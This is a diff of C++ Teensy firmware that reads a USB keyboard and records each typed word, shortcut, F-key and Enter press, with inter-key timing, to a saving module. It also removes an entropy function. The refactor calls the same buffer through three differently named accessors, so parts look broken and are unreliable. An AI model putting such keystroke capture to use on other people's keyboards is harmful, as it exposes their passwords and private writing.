@@ -2,38 +2,20 @@
 #include <USBHost_t36.h>
 #include <TeensyThreads.h>
 #include <cmath>
-#include <string.h> // Pour strncpy et strlen
+#include <string.h>
 #include <stdio.h>
+
+#include "AzertyLayout.h"
 #include "Queuing.h"
 #include "DataSaver.h"
-#include "TSHelper.h"
 #include "KeyHelper.h"
-#include "WordBuilder.h"
+#include "LettersBuffer.h"
+#include "StatsBuffer.h"
 
-static WordBuilder currentWord;
-static TimeHistory timeBetweenKeys;
+static LettersBuffer currentLettersBuffer;
+static StatsBuffer timeDeltaBetweenKeysBuffer;
 
-// --- ENTROPIE OPTIMISÉE (Moins de stack) ---
-float calculateEntropy(const char* s) {
-    uint8_t counts[256] = {0}; // 256 octets au lieu de 1024
-    int len = strlen(s);
-    if (len == 0) return 0.0f;
-
-    for (int i = 0; i < len; i++) {
-        counts[(unsigned char)s[i]]++;
-    }
-
-    float entropy = 0;
-    for (int i = 0; i < 256; i++) {
-        if (counts[i] > 0) {
-            float p = (float)counts[i] / len;
-            entropy -= p * log2f(p);
-        }
-    }
-    return entropy;
-}
-
-void handleSaving(const char* text, uint32_t ts, TimeHistory& history) {
+void handleSaving(const char* text, uint32_t ts, StatsBuffer& history) {
     if (strlen(text) == 0) return;
 
     WordMetadata data;
@@ -81,12 +63,11 @@ void InputHandlerFunc() {
 
             // --- TRAITEMENT DES TOUCHES ---
             if (KeyHelper::hasModifier(event.modifiers) && event.key != 0) {
-                if (!currentWord.isEmpty()) {
-                    handleSaving(currentWord.getWord(), event.timestamp, timeBetweenKeys);
-                    currentWord.clear();
+                if (!currentLettersBuffer.isEmpty()) {
+                    handleSaving(currentLettersBuffer.get_c_str(), event.timestamp, timeDeltaBetweenKeysBuffer);
+                    currentLettersBuffer.clear();
                 }
-                char shortcut[64];
-                WordBuilder::getShortcutName(event.key, event.modifiers, shortcut);
+                std::string shortcut = AzertyLayout::getShortcutName(event.key, event.modifiers);
                 saveShortcut(shortcut, event.timestamp);
             }
             else if (event.key >= 58 && event.key <= 69) { // F1-F12
@@ -94,47 +75,47 @@ void InputHandlerFunc() {
                 sprintf(fKey, "[F%d]", (int)(event.key - 57));
                 saveShortcut(fKey, event.timestamp);
             }
-            else if (delta > 5000000 && !currentWord.isEmpty() && !pendingSpace) {
-                 handleSaving(currentWord.getWord(), event.timestamp, timeBetweenKeys);
-                 currentWord.clear();
-                 timeBetweenKeys.clear();
+            else if (delta > 5000000 && !currentLettersBuffer.isEmpty() && !pendingSpace) {
+                 handleSaving(currentLettersBuffer.get(), event.timestamp, timeDeltaBetweenKeysBuffer);
+                 currentLettersBuffer.clear();
+                 timeDeltaBetweenKeysBuffer.clear();
             }
             else if (KeyHelper::isLetterOrNumber(event.key)) {
                 if (pendingSpace) {
-                    handleSaving(currentWord.getWord(), event.timestamp, timeBetweenKeys);
-                    currentWord.clear();
-                    timeBetweenKeys.clear();
+                    handleSaving(currentLettersBuffer.get(), event.timestamp, timeDeltaBetweenKeysBuffer);
+                    currentLettersBuffer.clear();
+                    timeDeltaBetweenKeysBuffer.clear();
                     pendingSpace = false;
                 }
-                else if (!currentWord.isEmpty()) {
-                    timeBetweenKeys.add(delta);
+                else if (!currentLettersBuffer.isEmpty()) {
+                    timeDeltaBetweenKeysBuffer.add(delta);
                 }
-                currentWord.add(event.key, event.modifiers);
+                currentLettersBuffer.add(event.key);
             }
             else if (KeyHelper::isBackspace(event.key)) {
                 if (pendingSpace) pendingSpace = false;
                 else {
-                    currentWord.backspace();
-                    if (currentWord.isEmpty()) timeBetweenKeys.clear();
+                    currentLettersBuffer.backspace();
+                    if (currentLettersBuffer.isEmpty()) timeDeltaBetweenKeysBuffer.clear();
                 }
             }
             else if (KeyHelper::isSpace(event.key)) {
-                if (!currentWord.isEmpty()) pendingSpace = true;
+                if (!currentLettersBuffer.isEmpty()) pendingSpace = true;
             }
             else if (KeyHelper::isEnter(event.key)) {
-                if (!currentWord.isEmpty()) {
-                    handleSaving(currentWord.getWord(), event.timestamp, timeBetweenKeys);
-                    currentWord.clear();
-                    timeBetweenKeys.clear();
+                if (!currentLettersBuffer.isEmpty()) {
+                    handleSaving(currentLettersBuffer.get(), event.timestamp, timeDeltaBetweenKeysBuffer);
+                    currentLettersBuffer.clear();
+                    timeDeltaBetweenKeysBuffer.clear();
                 }
                 pendingSpace = false;
                 saveShortcut("[ENTER]", event.timestamp);
             }
             else if (KeyHelper::isPunctuation(event.key)) {
-                if (pendingSpace || !currentWord.isEmpty()) {
-                     handleSaving(currentWord.getWord(), event.timestamp, timeBetweenKeys);
-                     currentWord.clear();
-                     timeBetweenKeys.clear();
+                if (pendingSpace || !currentLettersBuffer.isEmpty()) {
+                     handleSaving(currentLettersBuffer.getWord(), event.timestamp, timeDeltaBetweenKeysBuffer);
+                     currentLettersBuffer.clear();
+                     timeDeltaBetweenKeysBuffer.clear();
                      pendingSpace = false;
                 }
                 // Optionnel : sauvegarder la ponctuation ici
